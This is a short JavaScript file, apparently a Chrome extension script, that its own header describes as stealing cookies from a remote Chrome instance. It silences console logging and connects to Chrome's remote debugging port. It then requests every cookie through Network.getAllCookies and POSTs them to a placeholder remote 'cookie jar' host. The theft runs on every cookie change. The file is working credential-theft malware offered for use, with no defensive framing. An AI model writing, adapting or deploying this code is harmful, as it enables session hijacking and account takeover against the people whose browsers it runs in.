/**
 * An example stealing cookies from a remote Chrome instance.
 */

// Disable console logging. Obviously, comment this out if you want to see the logs.
class Console {
    static log(message) {
        return;
    }
}
let console = new Console();

const getCookieText = async (format) => {
    const cookies = await chrome.cookies.getAll({});
    return format.serializer(cookies);
}

async function saveCookies(body) {
    fetch("https://<remote_url>/add-cookie", {
        method: "POST",
        headers: {
            "Content-Type": "text/plain",
        },
        body
    })
}

async function handleClick() {
    var webSocketDebuggerUrl;
    var port = 9222; // Default port for remote debugging

    // Implemented using fetch:
    fetch("http://localhost:" + port + "/json", { // Assuming the remote Chrome instance is running on the same machine
        method: "GET",
        headers: {
            "Content-Type": "text/plain",
        },
    })
        .then(response => response.json())
        .then(data => {
            webSocketDebuggerUrl = data[0].webSocketDebuggerUrl;
            console.log(webSocketDebuggerUrl);
            var connection = new WebSocket(webSocketDebuggerUrl);

            // When the connection is open, request a cookie list
            connection.onopen = function () {
                connection.send('{"id": 1, "method": "Network.getAllCookies"}');
            };

            // Log errors
            connection.onerror = function (error) {
                console.log('WebSocket Error ' + error);
            };

            // Send the cookies to cookie jar
            connection.onmessage = function (e) {
                fetch("https://<remote_cookie_jar_url>/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(JSON.parse(e.data).result.cookies)
                })
            };
        })
        .catch(err => {
            // Failed to conenct to the remote Chrome instance
        });

}

chrome.cookies.onChanged.addListener(handleClick)